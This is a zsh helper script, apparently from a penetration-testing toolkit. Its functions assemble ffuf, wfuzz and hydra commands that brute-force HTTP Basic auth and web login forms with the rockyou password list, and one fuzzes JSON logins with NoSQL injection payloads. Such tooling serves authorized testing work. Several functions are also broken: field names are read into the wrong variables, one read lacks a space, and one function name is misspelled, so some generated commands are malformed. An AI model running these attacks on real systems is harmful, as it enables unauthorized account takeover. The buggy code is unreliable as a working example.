#!/usr/bin/env zsh

############################################################# 
# qq-enum-web-fuzz
#############################################################

qq-enum-web-fuzz-auth-basic-payloads() {
  local f=$(rlwrap -S 'FILE(wordlist): ' -e '' -c -o cat)
  local u && read "u?USERNAME: "
  print -z "file=\"${f}\"; while IFS= read line; do; echo -n \"${u}:\$line\" | base64 ; done <\"\$file\" > payloads.b64"
}

# ffuf

qq-enum-web-fuz-auth-basic-ffuf() {
  local u && read "u?URL: "
  local f=$(rlwrap -S 'FILE(payloads): ' -e '' -c -o cat)
  print -z "ffuf -w ${f} -H \"Authorization: Basic FUZZ\" -u ${u} -t 1 -p \"0.1\" -fc 401 "
}

qq-enum-web-fuzz-post-json-ffuf() {
  local u && read "u?URL: "
  print -z "ffuf -w /usr/share/seclists/Fuzzing/Databases/NoSQL.txt -u ${u} -X POST -H \"Content-Type: application/json\" -d '{\"username\": \"FUZZ\", \"password\": \"FUZZ\"}' -fr \"error\" "
}

qq-enum-web-fuzz-auth-post-ffuf() {
  local u && read "u?URL: "
  local uf && read "u?USERNAME(field): "
  local uv && read "user?USER(value): "
  local pf && read "p?PASSWORD(field): "
  print -z "ffuf -w ${__PASS_ROCKYOU}  -H \"Content-Type: application/x-www-form-urlencoded\" -X POST -d \"${uf}=${uv}&${pf}=FUZZ\" -u ${u} -fs 75 -t 5 -p \"0.1\" "
}

# wfuzz

qq-enum-web-fuzz-auth-post-wfuzz() {
  local u && read "u?URL: "
  local uf && read "u?USERNAME(field): "
  local uv && read "user?USER(value): "
  local pf && read "p?PASSWORD(field): "
  print -z "wfuzz -c -w ${__PASS_ROCKYOU} -d \"${uf}=${uv}&${pf}=FUZZ\" --sc 302 ${u}"
}

qq-enum-web-brute-hydra-get() {
  local r && read "r?RHOST: "
  local user && read "user?USERNAME: "
  local path && read "path?PATH(/path): "
  print -z "hydra -l ${user} -P ${__PASS_ROCKYOU} ${r} http-get ${path}"
}

qq-enum-web-brute-hydra-form-post() {
  local r && read "r?RHOST: "
  local path && read "path?PATH: "
  local u && read "u?USERNAME(field): "
  local user && read "user?USER(value): "
  local p && read "p?PASSWORD(field): "
  local fm && read"fm?FAILED(message): "
  print -z "hydra ${r} http-form-post \"${path}:${u}=^USER^&${p}=^PASS^:${fm}\" -l $u -P ${__PASS_ROCKYOU} -t 10 -w 30 "
}